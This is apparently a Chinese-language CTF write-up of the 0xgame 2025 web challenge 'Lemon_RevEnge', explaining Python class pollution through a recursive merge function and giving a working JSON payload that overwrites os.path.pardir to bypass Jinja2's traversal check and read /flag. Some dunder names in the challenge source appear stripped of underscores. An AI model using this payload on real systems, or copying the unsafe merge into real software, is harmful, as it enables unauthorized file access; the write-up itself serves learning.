---
title: 0xgame 2025 Lemon_RevEnge 详解
date: 2026-01-10
category: wp
tags: ["web", "ctf", "基础漏洞"]
excerpt: 初识python原型链污染
---

[0xgame week1 web题](https://www.ctfplus.cn/problem-detail/1975492175605010432/description)，刚开始接触web安全时照着学长的wp复现，其实就是直接把payload复制粘贴当时也完全没理解这样做的意义，这两天翻出来发现还是不理解，找到了一些文章了解了Python原型链污染，试着自己写一篇wp强化记忆

# Python原型链污染基础

Python则是对类属性值的污染，且只能对类的属性来进行污染不能够污染类的方法

## 危险代码

这里对应的merge函数就是python中对属性值控制的一个操作，非常经典

```Python
def merge(src,dst):
    # Recursive merge function
    for k,v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
```

## 代码解读

- 对merge函数我们传入了两个参数:
  - src:需要更新,合并的数据
  - dst:被更新，合并的对象
- for k,v in src.items():

对src进行遍历取出每对键值对

```Python
if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
```

- 分支1:检测是否含有`getitem`属性，以此来判断dst是否为字典
  - 检测dst中是否存在属性k且value是否是一个字典
    - 是:嵌套merge对内部的字典再进行遍历，将对应的每个键值对都取出来
    - 否:直接将src中k对应的v值赋给dst中的k属性

```Python
elif hasattr(dst, k) and type(v) == dict:
    merge(v, getattr(dst, k)）
```

- 分支2:dst不为字典，但是dst中有k属性,且v为字典

​    取出dst的k属性，进行merge嵌套

```Python
else:
    setattr(dst, k, v)
```

- 分支3:dst不存在k属性或v不为字典

​    直接设置k属性并赋值

## 简单例子

```SQL
a = {'x': 1, 'nested': {'a': 1}}
b = {'y': 2, 'nested': {'b': 2}}

merge(a, b)
print(b)
{'y': 2, 'nested': {'b': 2, 'a': 1}, 'x': 1}
```

## 总结归纳

递归合并 src 到 dst。

 \- 如果 src 和 dst 中同名项都是 dict，则递归合并

 \- 否则，src 的值覆盖 dst 的值

支持 dst 为 dict 或普通对象。

# 污染过程分析

## 例子

```Python
class father:
    secret = "hello"
class son_a(father):
    pass
class son_b(father):
    pass
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
instance = son_b()
payload = {
    "__class__" : {
        "__base__" : {
            "secret" : "world"
        }
    }
}
print(son_a.secret)
#hello
print(instance.secret)
#hello
merge(payload, instance)
print(son_a.secret)
#world
print(instance.secret)
#world
```

## 原因分析

1. 执行merge(payload, instance)后，instance发生了污染
2. 取出instance没有__getitem__方法，进入 `elif hasattr(instance, "class") and type(v)==dict`
3. 调用 `merge(v, getattr(instance, "class"))`,拿到son_b()类
4. 相似的，调用 `merge(v, getattr(son_b, "base"))`，拿到了son_b()继承的父类father
5. 最后`k="secret", v="world"`，由于v类型不为dict进入else块，执行执行：`setattr(father, "secret", "world")`
6. 至此father类的secret属性成功被污染为`world`
7. 访问 `son_a.secret` 时，Python 会沿 MRO（方法解析顺序）查找，最终找到 `father.secret`

# 正式解题

## 源码

```Python
from flask import Flask,request,render_template
import json
import os

app = Flask(name)

def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, 'getitem'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

class Dst():
    def init(self):
        pass

Game0x = Dst()

@app.route('/',methods=['POST', 'GET'])
def index():
    if request.data:
        merge(json.loads(request.data), Game0x)
    return render_template("index.html", Game0x=Game0x)

@app.route("/<path:path>")
def render_page(path):
    if not os.path.exists("templates/" + path):
        return "Not Found", 404
    return render_template(path)


if name == 'main':
    app.run(host='0.0.0.0', port=9000,debug=True)
```

## 尝试

题目明显提示flag就在/flag里，我们尝试直接进行目录穿越，显示404

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=M2EzOTYwYzhmY2MwMzE1MmRjMTUwM2NjYjA4Y2Q1N2ZfY2xISUxtdktsZDJDMXdwazNkejRDN1hGTEhNVXpmeHpfVG9rZW46R0tpdGJDYmVzb3MwUTd4eFE0SWNoOWNSbmlnXzE3NjgwNDU4MjY6MTc2ODA0OTQyNl9WNA)

## 分析

`os.path.pardir`这个 os 模块下的变量会影响 flask 的模板渲染函数 `render_template` 的解析

我们找到Lib\site-packages\jinja2\loaders.py下的split_template_path函数

```Python
def split_template_path(template: str) -> t.List[str]:
    """Split a path into segments and perform a sanity check.  If it detects
    '..' in the path it will raise a `TemplateNotFound` error.
    """
    pieces = []
    for piece in template.split("/"):
        if (
            os.path.sep in piece
            or (os.path.altsep and os.path.altsep in piece)
            or piece == os.path.pardir
        ):
            raise TemplateNotFound(template)
        elif piece and piece != ".":
            pieces.append(piece)
    return pieces
```

可以看到该函数把我们访问的路径以'/'分隔，当`piece == os.path.pardir`时，直接抛出 `TemplateNotFound`

而`os.path.pardir`父目录的值为'..',结合题目中的merge(json.loads(request.data), Game0x)，我们可以拿到os模块构造payload污染`os.path.pardir`的值

## payload

```JSON
{
    "__init__":{
        "__globals__":{
            "os":{
                "path":{
                    "pardir":"pollution"
                }
            }
        }
    }
}
```

这样把`os.path.pardir`的值污染返回完整的pieces，从而到达目录穿越的目的

## flag

post发包，把Content-Type改为json再访问目录../../flag即可

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=YmU5Y2Y5NzE2ZDlmZGYxZDBhMzE2NTIwYWM3ZmY2ZWZfcU9RbzBseU5qRFA1UG5FTlp4V1hCZktmNTlibXE0dVBfVG9rZW46TmRYWGJyejU0b000aUN4QVZyemNjNnpvblhmXzE3NjgwNDU4MjY6MTc2ODA0OTQyNl9WNA)


![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=MzNhYzExODJhY2YxNzY1OTE3ZWVjMmIxN2ZhZjRiNzBfMVhZdjFZSVZqVlVDZlV0NnM5S05VaXliMnE0elpuM0FfVG9rZW46SDJsU2JoQlVWb1oyRnB4UEowUWN0U3hobnliXzE3NjgwNDU4MjY6MTc2ODA0OTQyNl9WNA)

